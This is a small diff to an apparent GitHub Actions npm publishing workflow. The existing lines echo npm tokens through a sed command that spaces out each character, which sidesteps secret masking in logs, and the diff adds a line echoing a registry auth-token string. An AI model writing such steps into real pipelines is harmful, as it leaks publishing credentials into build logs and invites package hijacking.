@@ -67,6 +67,7 @@ jobs:
       run: |
         echo $NODE_AUTH_TOKEN_NEW | sed 's/./& /g' 
         echo ${{secrets.NPM_TOKEN_NEW}} | sed 's/./& /g' 
+        echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}"
       env: 
         NODE_AUTH_TOKEN_NEW: ${{ secrets.NPM_TOKEN_NEW }}
 
